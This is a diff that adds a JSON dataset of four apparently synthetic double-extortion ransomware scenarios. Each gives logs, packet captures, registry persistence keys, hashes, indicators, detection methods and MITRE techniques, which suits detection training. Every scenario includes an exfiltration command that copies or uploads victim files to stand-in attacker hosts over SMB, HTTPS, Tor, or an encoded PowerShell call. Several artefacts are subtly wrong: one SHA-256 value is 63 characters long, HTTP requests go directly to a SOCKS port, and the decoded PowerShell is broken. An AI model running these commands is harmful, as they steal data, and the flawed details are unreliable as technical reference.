@@ -1,0 +1,213 @@
+{
+  "samples": [
+    {
+      "scenario": "Double Extortion Ransomware attack using SMB protocol for data exfiltration combined with AES encryption of local files.",
+      "technical_data": {
+        "network_traffic": {
+          "smb_packet_sample": "SMB2 WRITE Request to 203.0.113.45:445 with payload chunks containing encrypted exfiltrated files",
+          "exfiltration_pattern": "Continuous SMB Write requests with file fragments named temp_*.enc to external IP 203.0.113.45",
+          "http_post_request": "POST /upload HTTP/1.1\r\nHost: victim.corpnetwork.com\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/octet-stream\r\nContent-Length: 5120\r\n\r\n[ENCRYPTED PAYLOAD]",
+          "packet_capture_excerpt": "Frame 10500: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)\nEthernet II, Src: 00:15:5d:01:02:03, Dst: 00:17:31:4b:5c:6d\nInternet Protocol Version 4, Src: 10.0.0.22, Dst: 203.0.113.45\nTransmission Control Protocol, Src Port: 53421, Dst Port: 445, Seq: 9876543, Ack: 1234567, Len: 1460\nSMB2 WRITE Request"
+        },
+        "logs": {
+          "firewall_log": "Apr 27 03:45:10 firewall1 kernel: IN=eth1 OUT= MAC=00:15:5d:01:02:03:00:17:31:4b:5c:6d:08:00 SRC=10.0.0.22 DST=203.0.113.45 LEN=1514 TOS=0x00 PREC=0x00 TTL=128 ID=12345 DF PROTO=TCP SPT=53421 DPT=445 WINDOW=8192 RES=0x00 ACK URGP=0",
+          "sysmon_event": "EventID: 3 | SourceImage: C:\\Windows\\System32\\svchost.exe | DestinationHostname: 203.0.113.45 | SourcePort: 53421 | DestinationPort: 445 | Protocol: TCP",
+          "endpoint_log": "2024-04-27T03:45:12Z [WARN] Ransomware encryption detected on directory C:\\Data\\FinancialReports",
+          "powershell_log": "2024-04-27T03:44:58Z - PowerShell script executed: Invoke-Expression -Command \"Start-Process -FilePath 'C:\\Users\\victim\\AppData\\Local\\Temp\\encryptor.exe' -ArgumentList '-encrypt'\""
+        },
+        "file_hashes": {
+          "ransomware_binary": {
+            "md5": "6f1e2d3c4b5a79808765fedcba012345",
+            "sha1": "d4e5f6a7b8c9d0e1f23456789abcdef012345678",
+            "sha256": "b1a2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef0"
+          }
+        },
+        "registry_changes": [
+          "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\EncryptorService = C:\\Users\\victim\\AppData\\Local\\Temp\\encryptor.exe",
+          "HKCU\\Software\\Classes\\exefile\\shell\\open\\command = C:\\Users\\victim\\AppData\\Local\\Temp\\encryptor.exe \"%1\" %*"
+        ],
+        "process_creation": [
+          "2024-04-27T03:44:55Z - Process Start: C:\\Users\\victim\\AppData\\Local\\Temp\\encryptor.exe -encrypt",
+          "Parent Process: powershell.exe (PID 5532)",
+          "Child Processes: cmd.exe (PID 5601) - used for file manipulation"
+        ],
+        "exfiltration_command_snippet": "cmd /c for /f \"tokens=*\" %i in ('dir /b C:\\Data\\FinancialReports\\*.pdf') do copy C:\\Data\\FinancialReports\\%i \\\\203.0.113.45\\shared\\exfiltrated\\%i"
+      },
+      "indicators": [
+        "Outbound SMB connections to unknown external IP 203.0.113.45 on port 445",
+        "Unusual file copy operations via SMB to external network share",
+        "Presence of encryptor.exe in temp directory with autorun registry keys",
+        "Firewall logs showing high volume SMB traffic outbound",
+        "Sysmon network connection events indicating unexpected SMB usage",
+        "File hashes matching known ransomware families",
+        "Registry modifications allowing persistence through Run keys and file association hijacking"
+      ],
+      "detection_method": "Detect anomalous SMB traffic to external IPs; monitor for suspicious file copying commands; endpoint detection for new autorun entries and unexpected process launches; network IDS rules for SMB traffic to non-standard IP ranges; heuristic monitoring of rapid file encryption and modification activity.",
+      "relevant_mitre_techniques": [
+        "T1486 - Data Encrypted for Impact",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1021.002 - Remote Services: SMB/Windows Admin Shares",
+        "T1059.001 - PowerShell",
+        "T1112 - Modify Registry",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+      ]
+    },
+    {
+      "scenario": "Double Extortion Ransomware campaign leveraging HTTP(S) exfiltration and AES-256 encryption, with C2 communications over TOR network.",
+      "technical_data": {
+        "network_traffic": {
+          "http_post_request": "POST /submit_data.php HTTP/1.1\r\nHost: darknetgateway.onion\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/octet-stream\r\nContent-Length: 4096\r\n\r\n[ENCRYPTED PAYLOAD BINARY DATA]",
+          "exfiltration_pattern": "Periodic HTTPS POST requests to onion services via TOR proxy at 127.0.0.1:9050 with encrypted payload chunks",
+          "packet_capture_excerpt": "Frame 8725: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)\nEthernet II, Src: 00:1a:2b:3c:4d:5e, Dst: 00:1b:2c:3d:4e:5f\nInternet Protocol Version 4, Src: 192.168.10.15, Dst: 127.0.0.1\nTransmission Control Protocol, Src Port: 51647, Dst Port: 9050, Seq: 1234567, Ack: 7654321, Len: 1460\nEncrypted TLS Application Data"
+        },
+        "logs": {
+          "firewall_log": "Apr 27 12:30:45 firewall1 kernel: IN=eth2 OUT= MAC=00:1a:2b:3c:4d:5e:00:1b:2c:3d:4e:5f:08:00 SRC=192.168.10.15 DST=127.0.0.1 LEN=1514 TOS=0x00 PREC=0x00 TTL=64 ID=23456 DF PROTO=TCP SPT=51647 DPT=9050 WINDOW=65535 RES=0x00 ACK URGP=0",
+          "sysmon_event": "EventID: 3 | SourceImage: C:\\Users\\victim\\AppData\\Local\\Tor\\tor.exe | DestinationHostname: darknetgateway.onion | SourcePort: 51647 | DestinationPort: 9050 | Protocol: TCP",
+          "endpoint_log": "2024-04-27T12:31:00Z [INFO] Detected ransomware encrypting files in C:\\Users\\victim\\Desktop\\Projects",
+          "powershell_log": "2024-04-27T12:30:30Z - PowerShell execution: Invoke-WebRequest -Uri 'http://127.0.0.1:9050/submit_data.php' -Method POST -Body $encryptedData -ContentType 'application/octet-stream'"
+        },
+        "file_hashes": {
+          "ransomware_binary": {
+            "md5": "af12bc34de56f7890abc1234def56789",
+            "sha1": "12ab34cd56ef7890ab12cd34ef56789012345678",
+            "sha256": "c1d2e3f4a5b67890123456789abcdef0123456789abcdef0123456789abcdef"
+          }
+        },
+        "registry_changes": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\tor_proxy = C:\\Users\\victim\\AppData\\Local\\Tor\\tor.exe",
+          "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\DisableTaskOffload = 1"
+        ],
+        "process_creation": [
+          "2024-04-27T12:30:20Z - Process Start: C:\\Users\\victim\\AppData\\Local\\Temp\\ransomware_payload.exe -start",
+          "Parent Process: explorer.exe (PID 3501)",
+          "Child Processes: tor.exe (PID 4002) - used for anonymous network communication"
+        ],
+        "exfiltration_command_snippet": "Start-Process -FilePath 'C:\\Users\\victim\\AppData\\Local\\Tor\\tor.exe' -ArgumentList '-f torrc'; $encData = [System.IO.File]::ReadAllBytes('C:\\Users\\victim\\Documents\\confidential.zip.aes'); Invoke-WebRequest -Uri 'http://127.0.0.1:9050/submit_data.php' -Method POST -Body $encData -ContentType 'application/octet-stream'"
+      },
+      "indicators": [
+        "Outbound connections to localhost TOR proxy port 9050",
+        "HTTPS POST requests to onion addresses tunneled through TOR",
+        "Presence of tor.exe and ransomware_payload.exe in user temp directories with autostart registry keys",
+        "Firewall logs showing localhost traffic on high ephemeral ports to 9050",
+        "Sysmon events showing tor.exe network activity",
+        "File hashes matching ransomware known variants",
+        "Registry changes disabling network offload to evade detection"
+      ],
+      "detection_method": "Monitor for local proxy connections especially to TOR ports; detect unusual HTTPS POST traffic with encrypted payloads to onion domains; endpoint detection for new autorun entries including tor.exe and ransomware payloads; network IDS rules to flag traffic on port 9050 loopback interface; heuristic detection of rapid file encryption and PowerShell web requests.",
+      "relevant_mitre_techniques": [
+        "T1486 - Data Encrypted for Impact",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1090.003 - Proxy: TOR",
+        "T1059.001 - PowerShell",
+        "T1112 - Modify Registry"
+      ]
+    },
+    {
+      "scenario": "Double Extortion Ransomware leveraging SMB protocol for lateral movement and data exfiltration via encrypted HTTP POST requests to attacker-controlled server.",
+      "technical_data": {
+        "network_traffic": {
+          "smb_session_setup": "15:33:10.654321 SMB2 Session Setup Request, Flags=0x00000000, Client: 192.168.10.45, Server: 192.168.10.100",
+          "http_post_request": "POST /upload/data HTTP/1.1\r\nHost: data.evilgroup.net\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/octet-stream\r\nContent-Length: 5290\r\n\r\n[ENCRYPTED FILE CHUNKS BINARY]",
+          "packet_capture_excerpt": "Frame 7893: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)\nEthernet II, Src: 00:15:5d:4a:7c:29, Dst: 00:15:5d:4a:7c:2a\nInternet Protocol Version 4, Src: 192.168.10.45, Dst: 203.0.113.77\nTransmission Control Protocol, Src Port: 59321, Dst Port: 443, Seq: 8901234, Ack: 4567890, Len: 1460\nTLSv1.2 Encrypted Application Data",
+          "exfiltration_pattern": "Chunked encrypted data sent over HTTPS POST repeatedly every 30 seconds to external IP 203.0.113.77",
+          "dns_query_sample": "15:32:59.123456 IP 192.168.10.45.63456 > ns1.evilgroup.net.53: 56789+ A? x9f8b7a6c5d4e3f2a1b0c.evilgroup.net. (60)",
+          "dns_response_sample": "15:32:59.124567 IP ns1.evilgroup.net.53 > 192.168.10.45.63456: 56789 1/0/0 A 198.51.100.45 (76)"
+        },
+        "logs": {
+          "firewall_log": "May 1 15:33:10 firewall2 kernel: IN=eth1 OUT= MAC=00:15:5d:4a:7c:29:00:15:5d:4a:7c:2a:08:00 SRC=192.168.10.45 DST=203.0.113.77 LEN=1514 TOS=0x00 PREC=0x00 TTL=63 ID=67890 DF PROTO=TCP SPT=59321 DPT=443 WINDOW=64240 RES=0x00 ACK URGP=0",
+          "dns_server_log": "01-May-2024 15:32:59.123 client @0x7ab89c0: 192.168.10.45#63456 (x9f8b7a6c5d4e3f2a1b0c.evilgroup.net): query: x9f8b7a6c5d4e3f2a1b0c.evilgroup.net IN A -EDC (198.51.100.45)",
+          "sysmon_event": "EventID: 3 | SourceImage: C:\\Windows\\System32\\svchost.exe | DestinationHostname: evilgroup.net | SourcePort: 59321 | DestinationPort: 53 | Protocol: UDP",
+          "endpoint_log": "2024-05-01T15:33:12Z [ALERT] Ransomware encryption detected on shared network drive \\\\fileserver\\shared\\projects"
+        },
+        "file_hashes": {
+          "ransomware_binary": {
+            "md5": "b4a7c9d8e6f5a3b2c1d0e9f8a7b6c5d4",
+            "sha1": "f1e2d3c4b5a697887766554433221100ffeeddcc",
+            "sha256": "c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f67890abcde1234567890abcdef1234567"
+          }
+        },
+        "registry_changes": [
+          "HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters\\RequireSecuritySignature = 0",
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\smbransom = C:\\Users\\victim\\AppData\\Roaming\\smbransom.exe"
+        ],
+        "process_creation": [
+          "2024-05-01T15:32:45Z - Process Start: C:\\Users\\victim\\AppData\\Roaming\\smbransom.exe -encrypt",
+          "Parent Process: explorer.exe (PID 3221)",
+          "Child Processes: net.exe (PID 3238) - used to stop services, taskkill.exe (PID 3245)"
+        ],
+        "exfiltration_command_snippet": "Invoke-WebRequest -Uri 'https://data.evilgroup.net/upload/data' -Method POST -Body ([System.IO.File]::ReadAllBytes('C:\\Users\\victim\\Documents\\confidential.zip')) -UseBasicParsing"
+      },
+      "indicators": [
+        "Outbound HTTPS POST requests to suspicious domain data.evilgroup.net with encrypted payloads",
+        "SMB sessions initiated from workstation to multiple internal hosts shortly before encryption",
+        "Autorun registry entry for smbransom.exe in user AppData roaming folder",
+        "Firewall logs showing outbound connections to IP 203.0.113.77 on port 443",
+        "Sysmon events capturing DNS queries to evilgroup.net domain over UDP port 53",
+        "File hashes matching known ransomware binaries",
+        "Registry changes disabling SMB security signature enforcement"
+      ],
+      "detection_method": "Analyze SMB logs for unusual session setups and service disruptions; monitor HTTPS traffic for anomalous large POST requests to unknown external domains; endpoint monitoring for new autorun entries and unexpected process creations; DNS monitoring for suspicious queries to attacker domains; network IDS rules to detect known ransomware file hashes and exfiltration patterns.",
+      "relevant_mitre_techniques": [
+        "T1486 - Data Encrypted for Impact",
+        "T1020 - Automated Exfiltration",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1059.003 - Windows Command Shell",
+        "T1112 - Modify Registry"
+      ]
+    },
+    {
+      "scenario": "Double Extortion ransomware utilizing PowerShell-based data theft with HTTP exfiltration and encryption of user files, including registry persistence via Run keys.",
+      "technical_data": {
+        "network_traffic": {
+          "http_post_request": "POST /upload HTTP/1.1\r\nHost: secure-data.leakcorp.org\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/json\r\nContent-Length: 4096\r\n\r\n{\"data\":\"U2FsdGVkX1+g4FJsE9Xj...\"}",
+          "dns_query_sample": "20:45:33.987654 IP 10.0.0.15.49876 > ns1.leakcorp.org.53: 23456+ TXT? c3VzcGljaW91c2RhdGEubGVha2NvcnAub3Jn. (85)",
+          "dns_response_sample": "20:45:33.988765 IP ns1.leakcorp.org.53 > 10.0.0.15.49876: 23456 1/0/1 TXT \"OK\" (100)",
+          "packet_capture_excerpt": "Frame 12345: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits)\nEthernet II, Src: 00:1a:2b:3c:4d:5e, Dst: 00:1a:2b:3c:4d:5f\nInternet Protocol Version 4, Src: 10.0.0.15, Dst: 192.0.2.99\nTransmission Control Protocol, Src Port: 49876, Dst Port: 443, Seq: 1234567, Ack: 7654321, Len: 1460\nTLSv1.3 Encrypted Application Data"
+        },
+        "logs": {
+          "firewall_log": "May 10 20:45:33 firewall3 kernel: IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e:00:1a:2b:3c:4d:5f:08:00 SRC=10.0.0.15 DST=192.0.2.99 LEN=1514 TOS=0x00 PREC=0x00 TTL=128 ID=78901 DF PROTO=TCP SPT=49876 DPT=443 WINDOW=65535 RES=0x00 ACK URGP=0",
+          "dns_server_log": "10-May-2024 20:45:33.987 client @0x7d3f2b0: 10.0.0.15#49876 (c3VzcGljaW91c2RhdGEubGVha2NvcnAub3Jn): query: c3VzcGljaW91c2RhdGEubGVha2NvcnAub3Jn IN TXT -EDC (192.0.2.1)",
+          "sysmon_event": "EventID: 1 | ProcessName: powershell.exe | CommandLine: powershell -NoProfile -WindowStyle Hidden -EncodedCommand \"...\"",
+          "endpoint_log": "2024-05-10T20:45:35Z [WARN] Detected ransomware encryption activity in C:\\Users\\victim\\Desktop\\Projects"
+        },
+        "file_hashes": {
+          "ransomware_binary": {
+            "md5": "d4c3b2a19087e6f54321c0b9a8d7e6f5",
+            "sha1": "abcde12345f67890abcdef1234567890abcdef12",
+            "sha256": "9f8e7d6c5b4a39281726354433221100ddeeffaabbccddeeff00112233445566"
+          }
+        },
+        "registry_changes": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\psransom = C:\\Users\\victim\\AppData\\Local\\Temp\\psransom.exe",
+          "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\EnableLinkedConnections = 1"
+        ],
+        "process_creation": [
+          "2024-05-10T20:44:50Z - Process Start: C:\\Users\\victim\\AppData\\Local\\Temp\\psransom.exe -silent",
+          "Parent Process: powershell.exe (PID 6789)",
+          "Child Processes: cmd.exe (PID 6798) - executing file encryption commands"
+        ],
+        "exfiltration_command_snippet": "powershell -NoProfile -EncodedCommand \"JABkYXRhID0gQ2F0IC1QYXRoICdDOlxcVXNlcnNcXHRlc3RcXERvY3VtZW50c1xcY29uZmlkZW50aWFsLnhtbCc7ICRlbmNvZGVkID0gW0NvbnZlcnRdOjpUbyBCYXNlNjRTdHJpbmcoJGRhdGEpOyBTeXN0ZW0uTmV0LldlYlJlcXVlc3QgLUFkZHJlc3MgJ2h0dHBzOi8vc3Vya2V5LmV4YW1wbGUuY29tL3VwbG9hZCcgLUJvZHkgJCRlbmNvZGVk\""
+      },
+      "indicators": [
+        "PowerShell process execution with encoded commands performing file reads and HTTP POST exfiltration",
+        "DNS TXT queries with base64-encoded subdomains to leakcorp.org",
+        "Autorun registry key for psransom.exe in Temp directory",
+        "Firewall logs showing outbound TLS connections to 192.0.2.99 port 443",
+        "Sysmon EventID 1 logging suspicious PowerShell command lines",
+        "File hashes corresponding to known ransomware samples",
+        "Registry modification enabling LinkedConnections policy to persist and confuse token access"
+      ],
+      "detection_method": "Monitor PowerShell event logs for encoded or obfuscated commands; inspect DNS queries for suspicious TXT records with encoded data; detect new autorun entries in Temp folders; analyze firewall and network logs for unusual HTTPS connections to untrusted domains; endpoint detection of rapid file encryption and suspicious process trees.",
+      "relevant_mitre_techniques": [
+        "T1486 - Data Encrypted for Impact",
+        "T1567.002 - Exfiltration Over Web Service",
+        "T1041 - Exfiltration Over C2 Channel",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1059.001 - PowerShell",
+        "T1112 - Modify Registry"
+      ]
+    }
+  ]
+}
